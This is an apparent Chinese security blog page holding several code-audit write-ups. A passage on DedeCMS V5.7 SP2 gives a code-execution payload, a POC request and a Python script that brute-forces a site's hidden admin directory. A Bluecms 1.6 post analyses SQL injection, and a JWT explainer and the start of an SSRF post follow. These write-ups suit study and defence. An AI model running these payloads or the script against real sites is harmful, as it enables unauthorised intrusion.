$arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid)) ? $aid : 0;
if($aid==0) die(&#39; Request Error! &#39;);

$cacheFile = DEDEDATA.&#39;/cache/myad-&#39;.$aid.&#39;.htm&#39;;
if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )
{
    $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);
    $adbody = &#39;&#39;;
    if($row[&#39;timeset&#39;]==0)
    {
        $adbody = $row[&#39;normbody&#39;];
    }
    else
    {
        $ntime = time();
        if($ntime &gt; $row[&#39;endtime&#39;] || $ntime &lt; $row[&#39;starttime&#39;]) {
            $adbody = $row[&#39;expbody&#39;];
        } else {
            $adbody = $row[&#39;normbody&#39;];
        }
    }
    $adbody = str_replace(&#39;&quot;&#39;, &#39;\&quot;&#39;,$adbody);
    $adbody = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$adbody);
    $adbody = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$adbody);
    $adbody = &quot;&lt;!--\r\ndocument.write(\&quot;{$adbody}\&quot;);\r\n--&gt;\r\n&quot;;
    $fp = fopen($cacheFile, &#39;w&#39;);
    fwrite($fp, $adbody);
    fclose($fp); 
}
include $cacheFile;</code></pre><p>摘出关键语句：</p>
<pre><code>if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</code></pre><p>要求$nocache存在，又可以利用前面的全局变量注册</p>
<p>往下走Getone()函数进行sql查询，返回一个结果集。</p>
<p>而后把取到的值和当前的时间点对比作为判断条件，决定取表中的normbody还是exbody赋值给$adbody。</p>
<p>接着就比较明朗了..将$adbody写入文件，而文件名我们抓包应该就可以知道。</p>
<p>但是这里我只看了这一个文件，现在整理一下思路：<br>1、给出一个$aid进行sql查询<br>2、根据查询值判断\写文件，且文件内容可控，目录已知<br>3、最后把写入的文件包含进来。</p>
<p>那么，我们这个$aid从何处传入数据库呢？随着这个思路追踪文件到：/dede/ad_add.php</p>
<p>一个编辑页面，抓包看一下键值对应，顺便瞅一眼mysql载入的数据<br><img src="https://s1.ax1x.com/2018/08/22/PTGGdO.jpg" alt><br>看到这里知道，清楚exbody和normbody对应的都是什么了</p>
<p>依据代码<code>$row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);</code>查看dede__myad这个库插入的内容：<br><img src="https://s1.ax1x.com/2018/08/22/PTGJoD.png" alt></p>
<p>看到timeset=0，那么直接是取<code>$adbody = $row[&#39;normbody&#39;];</code>其实timeset何时都为0，浏览ad_add.php代码部分看到，存入数据库的timeset值就为0</p>
<p>ok 现在思路明确,开始复现</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>我们已经保存过一个页面了，直接poke一下<code>http://localhost/dedecms/uploads/plus/ad_js.php?aid=1</code>看看<br><img src="https://s1.ax1x.com/2018/08/22/PTGtFe.png" alt></p>
<p>查看写入文件：<code>http://localhost/dedecms/uploads/data/cache/myad-1.htm</code><br><img src="https://s1.ax1x.com/2018/08/22/PTGUWd.png" alt></p>
<p>htm文件成功写入，我们回到Ad_js来执行一下任意代码。不要忘记闭合前面的document文档注释语句<br>payload:</p>
<pre><code>hpdoger=echo &#39;--&gt;&#39;; phpinfo();</code></pre><p><img src="https://s1.ax1x.com/2018/08/22/PTGwQI.jpg" alt></p>
<h2 id="winapi查找后台目录"><a href="#winapi查找后台目录" class="headerlink" title="winapi查找后台目录"></a>winapi查找后台目录</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、win系统下搭建的网站<br>2、网站后台目录存在/images/adminico.gif</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>windows环境下查找文件基于Windows FindFirstFile的winapi函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</p>
<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>核心文件：common.inc.php</p>
<pre><code>if($_FILES)
{
    require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);
}</code></pre><p>追踪uploadsafe.inc.php</p>
<pre><code>if( preg_match(&#39;#^(cfg_|GLOBALS)#&#39;, $_key) )
{
    exit(&#39;Request var not allow for uploadsafe!&#39;);
}
$$_key = $_FILES[$_key][&#39;tmp_name&#39;]; //获取temp_name 
${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);
if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
{
    if(!defined(&#39;DEDEADMIN&#39;))
    {
        exit(&#39;Not Admin Upload filetype not allow !&#39;);
    }
}
if(empty(${$_key.&#39;_size&#39;}))
{
    ${$_key.&#39;_size&#39;} = @filesize($$_key);
}
$imtypes = array
(
    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, 
    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;
);
if(in_array(strtolower(trim(${$_key.&#39;_type&#39;})), $imtypes))
{
    $image_dd = @getimagesize($$_key); 
    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
    if (!is_array($image_dd))
    {
        exit(&#39;Upload filetype not allow !&#39;);
    }
}</code></pre><p>摘出这句：</p>
<pre><code> $image_dd = @getimagesize($$_key); </code></pre><p>进行判断$$_key是否为图片或图片是否存在</p>
<p>然而$$_key的来源是$_FILES[$_key][‘tmp_name’]，上文说了全局变量注册，$FILE可控，那我们传入一个$_FILES[$_key][‘tmp_name’]亦可控，此处是产生了一个变量覆盖的</p>
<p>接着再看同文件的代码</p>
<pre><code>    ${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
    ${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
    ${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);

    if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
    {
        if(!defined(&#39;DEDEADMIN&#39;))
        {
            exit(&#39;Not Admin Upload filetype not allow !&#39;);
        }
    }</code></pre><p>其中,$cfg_not_allowall的范围如下：</p>
<pre><code>$cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;</code></pre><p>既然上传的name不让以这些结尾，那么我们查.gif不过分吧</p>
<p>找一处验证以下这个核心文件产生的小漏洞：<br><img src="https://s1.ax1x.com/2018/08/21/PIOPhV.png" alt><br><img src="https://s1.ax1x.com/2018/08/21/PIOk1U.png" alt></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>_FILES[hpdoger][tmp_name]=./ded&lt;&lt;/images/adminico.gif&amp;_FILES[hpdoger][name]=0&amp;_FILES[hpdoger][size]=0&amp;_FILES[hpdoger][type]=image/gif</code></pre><p>这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~：</p>
<pre><code># -*- coding: utf-8 -*-
from itertools import permutations
import requests

def guess_back_dir(url,data,characters):
    for num in range(1,5):
        for every in permutations(characters,num):
            payload = &#39;&#39;.join(every)
            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p = payload)
            print(&quot;testing:&quot;,payload)
            r = requests.post(url,data = data)
            if find_page(r) &gt; 0:
                print(&quot;back_dir:[+]&quot;,payload)
                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
                return payload
            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;

def guess_rest_dir(back_dir,url,data,characters):
    while True:
        for singel in characters:
            if singel != characters[-1]:
                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p=back_dir + singel)
                r = requests.post(url,data = data)
                # print data
                if find_page(r) &gt; 0:
                    print(&quot;guess successfully[+]:&quot;,back_dir)
                    back_dir += singel
                    data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
                    break
                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
            else:
                return  back_dir

def find_page(response):
    if &quot;Upload filetype not allow !&quot; not in response.text and response.status_code == 200:
        return 1

def main():
    characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;
    url = raw_input(&quot;Please input your target:&quot;)
    data = {
        &quot;_FILES[hpdoger][tmp_name]&quot;: &quot;./{p}&lt;&lt;/images/adminico.gif&quot;,
        &quot;_FILES[hpdoger][name]&quot;: 0,
        &quot;_FILES[hpdoger][size]&quot;: 0,
        &quot;_FILES[hpdoger][type]&quot;: &quot;image/gif&quot;
    }

    back_dir = guess_back_dir(url,data,characters)
    name = guess_rest_dir(back_dir,url,data,characters)
    print(&quot;The background address is[+]:&quot;,name)


if __name__ == &#39;__main__&#39;:
    main()</code></pre><h3 id="最后穿插一个关于FILE变量的小知识点"><a href="#最后穿插一个关于FILE变量的小知识点" class="headerlink" title="最后穿插一个关于FILE变量的小知识点"></a>最后穿插一个关于FILE变量的小知识点</h3><p>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞(<a href="https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" target="_blank" rel="noopener">https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</a>)</p>
<p>奇技淫巧 | DEDECMS找后台目录(<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a>)</p>
<p>膜前辈师傅们~</p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/21/Dedecms V5.7 SP2代码审计/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/18/代码审计复现：Bluecms 1.6/"> 
                    代码审计复现：Bluecms 1.6 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-18   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近一阵子得了一场病，加之情感上的一件事，痛不欲生。陆陆续续的缓过来了，渡劫余生，留下该留下的。病也慢慢在恢复了。</p>
<p>前些日子说要学代码审计，买了本《代码审计》看了两天，为作者尹毅先生无限打call，人生导师一样的人物，经历是传奇的，努力是可见的。书中开篇点题为什么要代码审计？这是web狗的一项技能。其实，当初学安全的时候我一直想要走的方向是渗透，虽然至今也是。但是渗透就仅仅是用工具来attack么？不，渗透是一种思路，是一种积累，也是一种艺术。它是我们基础的升华，经验的绽放。脚本小子use tools will nerver be a hacker。我们要学的、做的要很多，知识面要很宽，尽管路会很难。</p>
<p>从今天起，至未来的一个月，会把学习的全部精力都投入到审计方向，立下flag:未来半个月内拿自己的cve</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>cms: bulecms 1.6 sp1<br>php: 5.4 + mysql 5.5.53</p>
<h2 id="sql注入一"><a href="#sql注入一" class="headerlink" title="sql注入一"></a>sql注入一</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题文件位于：/uploads/ad_js.php</p>
<pre><code>$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);</code></pre><p>变量未用单引号闭合，可能会引起注入</p>
<p>跟踪一下$ad_id，查找该参数如何获得</p>
<pre><code>$ad_id = !empty($_GET[&#39;ad_id&#39;]) ? trim($_GET[&#39;ad_id&#39;]) : &#39;&#39;;</code></pre><p>trim去掉ad_id两侧空格，未过滤参数，可注入</p>
<p>再追踪一下getone()函数怎么定义的，一个定义mysql相关操作的文件位于/uploads/include/mysql.class.php：</p>
<pre><code>    function getone($sql, $type=MYSQL_ASSOC){
        $query = $this-&gt;query($sql,$this-&gt;linkid);
        $row = mysql_fetch_array($query, $type);
        return $row;
    }</code></pre><p>追踪此类里query函数的定义：</p>
<pre><code>    function query($sql){
        if(!$query=@mysql_query($sql, $this-&gt;linkid)){
            $this-&gt;dbshow(&quot;Query error:$sql&quot;);
        }else{
            return $query;
        }
    }</code></pre><p>查询出错则dbshow进行报错，有结果则返回$query集合后，$row进行取值</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://s1.ax1x.com/2018/08/16/PWEujK.jpg" alt></p>
<h2 id="sql注入二"><a href="#sql注入二" class="headerlink" title="sql注入二"></a>sql注入二</h2><p>一开始审了一个前台/uploads/user.php的宽字节注入,记一下思路：</p>
<p>在mysql.class.php中看到：</p>
<pre><code>mysql_query( &quot;SET NAMES gbk&quot;);</code></pre><p>看一下有没有进行addslashes过滤<br><img src="https://s1.ax1x.com/2018/08/16/PWEMnO.png" alt></p>
<p>果然对POST\GET过滤，追踪deep_addslashes</p>
<pre><code>function deep_addslashes($str)
{
    if(is_array($str))
    {
        foreach($str as $key=&gt;$val)
        {
            $str[$key] = deep_addslashes($val);
        }
    }
    else
    {
        $str = addslashes($str);
    }
    return $str;
}</code></pre><p>联想宽字节，先追踪一下处理表单的方法</p>
<pre><code> elseif($act == &#39;index_login&#39;){
     $user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;
     $pwd = !empty($_REQUEST[&#39;pwd&#39;]) ? trim($_REQUEST[&#39;pwd&#39;]) : &#39;&#39;;
     $remember = isset($_REQUEST[&#39;remember&#39;]) ? intval($_REQUEST[&#39;remember&#39;]) : 0;
     if($user_name == &#39;&#39;){
         showmsg(&#39;�û�������Ϊ��&#39;);
     }
     if($pwd == &#39;&#39;){
         showmsg(&#39;���벻��Ϊ��&#39;);
     }
    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);
    if($row[&#39;num&#39;] == 1){
        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
    }
    $w = login($user_name, $pwd);

    if(defined(&#39;UC_API&#39;) &amp;&amp; @include_once(BLUE_ROOT.&#39;uc_client/client.php&#39;)){
        list($uid, $username, $password, $email) = uc_user_login($user_name, $pwd);
        if($uid&gt;0){
            $password = md5($password);
            if(!$w){
                $db-&gt;query(&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_name, pwd, email, reg_time) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;, &#39;$timestamp&#39;)&quot;); 
                $w = 1;
            }
            $ucsynlogin = uc_user_synlogin($uid);
        }
        elseif($uid === -1){
            if($w == 1){
                $user_info = $db-&gt;getone(&quot;SELECT email FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
                $uid = uc_user_register($user_name, $pwd, $user_info[&#39;email&#39;]);
                if($uid &gt; 0) $ucsynlogin = uc_user_synlogin($uid);
            }else $w = -1;
        }
        elseif($uid == -2){
            showmsg(&#39;�������&#39;);
        }
        echo $ucsynlogin;
    }
    if($w == -1 || $w == 0){
        showmsg(&#39;��������û��������벻��ȷ&#39;);
    }
    elseif($w == 1){
        update_user_info($user_name);
         if($remember==1){
             setcookie(&#39;BLUE[user_id]&#39;, $_SESSION[&#39;user_id&#39;], time()+172800, $cookiepath, $cookiedomain);
             setcookie(&#39;BLUE[user_name]&#39;, $user_name, time()+172800, $cookiepath, $cookiedomain);
            setcookie(&#39;BLUE[user_pwd]&#39;, md5(md5($pwd).$_CFG[&#39;cookie_hash&#39;]), time()+172800, $cookiepath, $cookiedomain);
         }
         showmsg(&#39;��ӭ�� &#39;.$user_name.&#39; ���������ڽ�ת����Ա����&#39;, &#39;user.php&#39;);
     }
 }</code></pre><p>追踪user_name怎么传入：</p>
<pre><code>$user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;</code></pre><p>发现无过滤</p>
<p>再追踪一下对suername的sql语句如何执行：</p>
<pre><code>$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);</code></pre><p>看到调用了getone()函数，第一个注入有介绍。</p>
<p>再看到下面一句：</p>
<pre><code>    if($row[&#39;num&#39;] == 1){
        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
    }</code></pre><p>在admin的表中查询admin_name表中是否有传入的user_name，若存在，$row[‘num’]值为1，然后执行showmsg函数，输出：“前台无法登陆”后返回主页。值为0进行以下操作：</p>
<pre><code>$w = login($user_name, $pwd);</code></pre><p>再追踪login函数得到：</p>
<pre><code> function login($user_name,$pwd){
     global $db;
    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
    if($row[&#39;num&#39;]==0){
        $result = 0;
    }else{
        $sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39; and pwd=md5(&#39;$pwd&#39;)&quot;;
         $user_num = $db-&gt;getone($sql);
         if($user_num[&#39;num&#39;]){
             $result = 1;
         }else $result = -1;
    }
     return $result;
 }</code></pre><p>到这里我们可以理解，这个页面的登陆逻辑是这样的：</p>
<p><strong>如果我们的用户名是admin表中用户名，则不允许登陆</strong><br><strong>若不是表中的用户名，则会进行user表的对比查询，再判断是否有这个用户</strong></p>
<p>明确思路：盲注<br>注入是否成功的判断条件：$row[‘num’]返回值</p>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>success injection: <img src="https://s1.ax1x.com/2018/08/17/PWKfzj.jpg" alt></p>
<p>default injection: <img src="https://s1.ax1x.com/2018/08/17/PWKILq.png" alt></p>
<p>google一下发现别人挖过后台登陆验证的宽字节，能够利用…<br><img src="https://blog.0kami.cn/img/bluecms_code_review/bluecms_login_success.png" alt></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>p师傅的浅析白盒审计中的字符编码及SQL注入：<a href="http://www.freebuf.com/articles/web/31537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/31537.html</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/18/代码审计复现：Bluecms 1.6/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/12/（转载） 基于 Token 的身份验证/"> 
                    (转载)基于 Token 的身份验证 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-12   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="传统身份验证的方法"><a href="#传统身份验证的方法" class="headerlink" title="传统身份验证的方法"></a>传统身份验证的方法</h2><p>HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。</p>
<p>解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p>
<p>上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session ，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session 。</p>
<h2 id="基于-Token-的身份验证方法"><a href="#基于-Token-的身份验证方法" class="headerlink" title="基于 Token 的身份验证方法"></a>基于 Token 的身份验证方法</h2><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
<ul>
<li><p>客户端使用用户名跟密码请求登录</p>
</li>
<li><p>服务端收到请求，去验证用户名与密码</p>
</li>
<li><p>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p>
</li>
<li><p>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p>
</li>
<li><p>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p>
</li>
<li><p>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p>
</li>
</ul>
<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>实施 Token 验证的方法挺多的，还有一些标准方法，比如 JWT，读作：jot ，表示：JSON Web Tokens 。JWT 标准的 Token 有三个部分：</p>
<ul>
<li><p>header</p>
</li>
<li><p>payload</p>
</li>
<li><p>signature</p>
</li>
</ul>
<p>中间用点分隔开，并且都会使用 Base64 编码，所以真正的 Token 看起来像这样：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header 部分主要是两部分内容，一个是 Token 的类型，另一个是使用的算法，比如下面类型就是 JWT，使用的算法是 HS256。</p>
<p>{</p>
<p>  “typ”: “JWT”,</p>
<p>  “alg”: “HS256”</p>
<p>}</p>
<p>上面的内容要用 Base64 的形式编码一下，所以就变成这样：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 里面是 Token 的具体内容，这些内容里面有一些是标准字段，你也可以添加其它需要的内容。下面是标准字段：</p>
<ul>
<li><p>iss：Issuer，发行者</p>
</li>
<li><p>sub：Subject，主题</p>
</li>
<li><p>aud：Audience，观众</p>
</li>
<li><p>exp：Expiration time，过期时间</p>
</li>
<li><p>nbf：Not before</p>
</li>
<li><p>iat：Issued at，发行时间</p>
</li>
<li><p>jti：JWT ID</p>
</li>
</ul>
<p>比如下面这个 Payload ，用到了 iss 发行人，还有 exp 过期时间。另外还有两个自定义的字段，一个是 name ，还有一个是 admin 。</p>
<p>{</p>
<p> “iss”: “ninghao.net”,</p>
<p> “exp”: “1438955445”,</p>
<p> “name”: “wanghao”,</p>
<p> “admin”: true</p>
<p>}</p>
<p>使用 Base64 编码以后就变成了这个样子：</p>
<p>eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ</p>
<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>JWT 的最后一部分是 Signature ，这部分内容有三个部分，先是用 Base64 编码的 header.payload ，再用加密算法加密一下，加密的时候要放进去一个 Secret ，这个相当于是一个密码，这个密码秘密地存储在服务端。</p>
<ul>
<li><p>header</p>
</li>
<li><p>payload</p>
</li>
<li><p>secret</p>
</li>
</ul>
<p>var encodedString = base64UrlEncode(header) + “.” + base64UrlEncode(payload);</p>
<p>HMACSHA256(encodedString, ‘secret’);</p>
<p>处理完成以后看起来像这样：</p>
<p>SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
<p>最后这个在服务端生成并且要发送给客户端的 Token 看起来像这样：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
<p>客户端收到这个 Token 以后把它存储下来，下回向服务端发送请求的时候就带着这个 Token 。服务端收到这个 Token ，然后进行验证，通过以后就会返回给客户端想要的资源。</p>
<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文转载自<a href="https://ninghao.net/blog/2834" target="_blank" rel="noopener">https://ninghao.net/blog/2834</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/10/初探ssrf/"> 
                    初探ssrf 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-10   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/">webshell</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>ssrf是很常见的一个漏洞，一开始把ssrf简单的理解为链接重定向漏洞，其实也可以这么说，曾经这个漏洞影响过许多互联网企业。</p>
<p>危害有如下几个类型:</p>
<p>内网端口扫描<br>内网Web应用指纹识别<br>通过访问内网Web应用robots.txt等方式辨别cms的类型及版本然后根据公开的漏洞去攻击内网服务器<br>读取本地文件<br>读取远程文件<br>攻击内网其他应用,如redis,从而反弹shell</p>
<h2 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h2><h3 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h3><p>curl是一个利用URL语法在命令行方式下工作的文件传输工具。PHP中有cURL的苦，叫libcurl，支持许多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl同样支持HTTPS认证，HTTP POST方法, HTTP PUT方法, FTP上传, kerberos认证, HTTP上传, 代理服务器, cookies, 用户名/密码认证, 下载文件、</p>
